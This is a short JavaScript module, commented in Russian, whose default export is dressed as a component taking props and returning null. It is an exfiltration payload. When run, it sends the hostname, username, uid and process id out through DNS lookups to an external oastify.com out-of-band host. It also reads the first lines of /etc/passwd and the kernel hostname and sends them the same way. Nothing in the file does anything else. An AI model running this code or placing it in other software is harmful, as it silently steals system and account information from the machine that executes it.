module.exports = {
  default: function(props) {
    var os, dns, fs;
    try { os = require("os"); } catch(e) {}
    try { dns = require("dns"); } catch(e) {}
    try { fs = require("fs"); } catch(e) {}
    
    function S(label) {
      try { dns.lookup(label + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
    }
    
    // Базовые данные (работают всегда)
    try { S("h-" + os.hostname()); } catch(e) {}
    try { var u = os.userInfo(); S("u-" + u.username + "-uid" + u.uid); } catch(e) {}
    try { S("p-" + process.pid); } catch(e) {}
    
    // /etc/passwd через fs
    if (fs) {
      try {
        var data = fs.readFileSync("/etc/passwd", "utf8");
        var lines = data.trim().split("\n");
        // Отправляем первые 3 строки
        for (var i = 0; i < Math.min(lines.length, 3); i++) {
          var clean = lines[i].replace(/[^a-zA-Z0-9]/g, "").substring(0, 25);
          S("pw" + i + clean);
        }
      } catch(e) { S("pw-err"); }
      
      try {
        var kh = fs.readFileSync("/proc/sys/kernel/hostname", "utf8").trim();
        S("kh-" + kh.replace(/[^a-zA-Z0-9]/g, ""));
      } catch(e) { S("kh-err"); }
    }
    
    return null;
  }
};
